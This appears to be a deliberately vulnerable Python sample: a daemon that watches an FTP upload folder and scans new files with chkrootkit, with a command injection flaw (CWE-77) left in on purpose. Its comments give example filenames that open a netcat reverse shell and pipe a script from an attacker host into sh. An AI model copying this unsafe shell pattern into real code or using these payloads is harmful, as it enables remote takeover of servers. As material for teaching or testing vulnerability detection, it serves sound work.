import os
import time
import sqlite3
import logging
import subprocess
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# Configure logging for the Automated Threat Hunter
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - ThreatHunter - %(levelname)s - %(message)s'
)
logger = logging.getLogger("AutoMalwareScanner")

DB_FILE = "scan_history.db"
WATCH_DIR = "/var/lib/ftp/uploads"

def init_scan_db():
    """Initializes the SQLite database to keep track of scanned files and threats."""
    if not os.path.exists(WATCH_DIR):
        os.makedirs(WATCH_DIR, exist_ok=True)
        
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE scan_results (
            scan_id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            file_path TEXT NOT NULL,
            scan_status TEXT NOT NULL,
            threat_level TEXT NOT NULL,
            tool_output TEXT
        )
    ''')
    
    # Insert mock historical records
    mock_history = [
        ('/var/lib/ftp/uploads/report.pdf', 'COMPLETED', 'CLEAN', 'No threats found.'),
        ('/var/lib/ftp/uploads/invoice.exe', 'COMPLETED', 'HIGH', 'Troj.Win32.Generic detected.')
    ]
    cursor.executemany('''
        INSERT INTO scan_results (file_path, scan_status, threat_level, tool_output)
        VALUES (?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("Threat hunter database initialized.")


def log_scan_result(filepath: str, status: str, threat_level: str, output: str):
    """Records the outcome of an automated scan."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO scan_results (file_path, scan_status, threat_level, tool_output) VALUES (?, ?, ?, ?)",
            (filepath, status, threat_level, output)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to log scan result for {filepath}: {e}")


def execute_malware_analysis(file_path: str):
    """
    VULNERABLE FUNCTION: CWE-77 Command Injection
    Trigger Path: File System Event (Extracting the dynamically created filename)
    """
    logger.info(f"Initiating malware signature analysis on: {file_path}")
    
    # Vulnerability: Direct string concatenation of the filename into a shell command.
    # An attacker who creates/uploads a file with a specially crafted name can execute arbitrary commands.
    analysis_command = f"chkrootkit -q -x {file_path}"
    
    try:
        logger.debug(f"Executing system analysis command: {analysis_command}")
        
        # shell=True allows the execution of shell metacharacters embedded in the filename
        # (e.g., uploading a file named: "file.txt; nc attacker.com 4444 -e /bin/bash")
        process = subprocess.Popen(
            analysis_command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate(timeout=45)
        
        if process.returncode == 0:
            logger.info(f"Scan complete. File appears clean: {file_path}")
            log_scan_result(file_path, "SUCCESS", "CLEAN", stdout)
            return True
        else:
            logger.warning(f"Scan complete. Potential threat detected in: {file_path}")
            # Leaking the stderr/stdout to the database could allow the attacker to read the output
            # of their injected commands if they have access to a downstream dashboard.
            log_scan_result(file_path, "SUCCESS", "SUSPICIOUS", stdout + "\n" + stderr)
            return False
            
    except subprocess.TimeoutExpired:
        logger.error(f"Analysis timed out for {file_path}.")
        log_scan_result(file_path, "TIMEOUT", "UNKNOWN", "Analysis exceeded 45 seconds.")
        return False
    except Exception as e:
        logger.error(f"Critical error during analysis of {file_path}: {e}")
        log_scan_result(file_path, "ERROR", "UNKNOWN", str(e))
        return False


class UploadFolderWatcher(FileSystemEventHandler):
    """Watchdog event handler that triggers when a new file is created in the directory."""
    
    def on_created(self, event):
        # We only want to scan files, not directories
        if event.is_directory:
            return
        
        logger.info(f"New file detected by filesystem watcher: {event.src_path}")
        
        # Ignore hidden files or partial/temporary uploads often used by FTP servers
        if os.path.basename(event.src_path).startswith('.'):
            return
            
        # Pass the untrusted file path (which includes the filename) to the vulnerable function
        execute_malware_analysis(event.src_path)


def start_threat_hunter():
    """Configures and starts the directory watcher daemon."""
    init_scan_db()
    
    event_handler = UploadFolderWatcher()
    observer = Observer()
    observer.schedule(event_handler, WATCH_DIR, recursive=False)
    
    logger.info("Starting AutoMalwareScanner daemon.")
    logger.info(f"Monitoring directory for new uploads: {WATCH_DIR}")
    
    # Example Exploitation via touch or an FTP upload:
    # touch "/var/lib/ftp/uploads/normal.txt; curl http://attacker.com/payload.sh | sh; #"
    
    observer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Shutting down AutoMalwareScanner daemon.")
        observer.stop()
    observer.join()


if __name__ == "__main__":
    start_threat_hunter()
